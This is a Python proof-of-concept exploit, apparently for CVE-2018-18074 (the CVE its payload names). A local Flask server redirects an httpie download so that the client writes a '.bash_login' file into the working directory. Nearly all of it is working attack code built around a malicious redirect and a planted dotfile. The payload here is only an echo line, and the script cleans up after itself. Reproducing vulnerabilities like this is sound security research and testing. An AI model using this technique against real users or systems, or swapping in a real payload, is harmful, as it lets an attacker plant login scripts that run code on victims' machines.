import threading
import subprocess
import os
import sys
import time
import shutil
import requests
from email.utils import formatdate
from flask import Flask, redirect, make_response, send_from_directory

# --- Configuration ---
HOST = "127.0.0.1"
PORT = 8000
MALICIOUS_FILENAME = ".bash_login"
MALICIOUS_CONTENT = f'# Created by CVE-2018-18074 PoC\necho "VULNERABLE"\n'
# Use absolute path for the static dir to avoid issues when running in a thread
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
# Define the target directory for the attack (where the script is run)
TARGET_DIR = os.getcwd()
MALICIOUS_FILE_PATH = os.path.join(TARGET_DIR, MALICIOUS_FILENAME)

# --- Flask Server Setup ---
app = Flask(__name__)


@app.route('/original_filename', methods=['GET', 'POST'])
def perform_redirect():
    """This route sends the redirect instruction."""
    print(f"[SERVER] Received request for /original_filename. Sending redirect...")
    return redirect(f"http://{HOST}:{PORT}/static/{MALICIOUS_FILENAME}", code=302)


@app.route('/static/<path:filename>')
def serve_malicious_file(filename):
    """This route serves the malicious file with specific headers to trigger the vulnerability."""
    print(f"[SERVER] Serving malicious file {filename} with special headers...")
    try:
        # Manually read the file to have full control over the response headers
        filepath = os.path.join(STATIC_DIR, filename)
        with open(filepath, 'rb') as f:
            content = f.read()

        # Create a base response
        response = make_response(content)

        # Set headers to mimic a file download, which is necessary for the exploit
        response.headers['Content-Type'] = 'application/json'
        response.headers['Content-Disposition'] = 'inline'
        response.headers['Content-Length'] = str(len(content))

        return response
    except Exception as e:
        print(f"[SERVER] Error: Could not serve file: {e}")
        return "File not found", 404


def run_poc():
    """
    Main function to orchestrate the Proof of Concept.
    """
    exit_code = 1  # Default to failure

    # Check if 'http' (httpie) command exists
    if not shutil.which("http"):
        print("[-] Error: 'http' command not found. Please install httpie (`pip install httpie`).")
        sys.exit(exit_code)

    # 1. Setup malicious file and directory
    # Check if the target file already exists in the target directory
    if os.path.exists(MALICIOUS_FILE_PATH):
        print(f"[-] Warning: Target file '{MALICIOUS_FILE_PATH}' already exists. Please remove it before running.")
        sys.exit(exit_code)

    if not os.path.exists(STATIC_DIR):
        os.makedirs(STATIC_DIR)

    with open(os.path.join(STATIC_DIR, MALICIOUS_FILENAME), 'w') as f:
        f.write(MALICIOUS_CONTENT)
    print(f"[SETUP] Created malicious file at '{os.path.join(STATIC_DIR, MALICIOUS_FILENAME)}'")

    # 2. Start Flask server in a background thread
    # Disable the reloader to prevent errors when running in a thread.
    server_thread = threading.Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False))
    server_thread.daemon = True
    server_thread.start()
    print(f"[+] Malicious redirect server started on http://{HOST}:{PORT}")
    time.sleep(1)  # Give the server a moment to start up

    try:
        # 3. Run the vulnerable httpie client
        print(f"[+] Running httpie client in target directory '{TARGET_DIR}'...")
        command = [
            "http",
            "--download",
            f"http://{HOST}:{PORT}/original_filename"
        ]

        result = subprocess.run(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=TARGET_DIR  # Explicitly set the working directory for httpie
        )
        print("\n--- HTTPie Client Output ---\n")
        print(result.stderr.decode(errors='ignore'))
        print("--- End of Client Output ---\n")

        # 4. Verify the result
        print("[+] Verifying exploit result...")
        # Check if the file was created in the target directory
        if os.path.exists(MALICIOUS_FILE_PATH):
            with open(MALICIOUS_FILE_PATH, 'r') as f:
                content = f.read()
            if content == MALICIOUS_CONTENT:
                print(f"[SUCCESS] Exploit successful! Malicious file '{MALICIOUS_FILE_PATH}' was created.")
                exit_code = 0
            else:
                print(f"[FAIL] Exploit failed. File '{MALICIOUS_FILE_PATH}' was created, but content does not match.")
        else:
            print(f"[FAIL] Exploit failed. File '{MALICIOUS_FILENAME}' was not created in target directory.")

    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
    finally:
        # 5. Cleanup
        print("[+] Cleaning up created files and directories...")

        # The server thread is a daemon and will exit automatically.
        time.sleep(0.5)

        # Clean up the created file in the target directory
        if os.path.exists(MALICIOUS_FILE_PATH):
            os.remove(MALICIOUS_FILE_PATH)

        if os.path.exists(STATIC_DIR):
            shutil.rmtree(STATIC_DIR)

        print("[+] Cleanup complete.")
        print(f"[+] PoC execution finished. Exiting with status code {exit_code}.")
        sys.exit(exit_code)


if __name__ == '__main__':
    run_poc()
